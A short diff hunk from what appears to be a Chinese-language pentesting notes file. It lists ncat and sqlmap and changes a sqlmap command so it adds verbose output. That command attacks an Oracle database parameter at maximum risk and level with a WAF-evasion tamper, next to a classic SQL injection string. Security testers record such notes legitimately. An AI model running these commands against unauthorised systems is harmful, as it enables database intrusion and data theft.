@@ -970,7 +970,7 @@ https://github.com/nmap/nmap/tree/master/ncat
 SQL 注入：sqlmap
 https://github.com/sqlmapproject/sqlmap/archive/master.zip
 -----
-python sqlmap.py -r 123.log -p id --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string="200 OK"
+python sqlmap.py -r 123.log -p id -v 3 --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string="200 OK"
 -----
 'or '1'='1
 
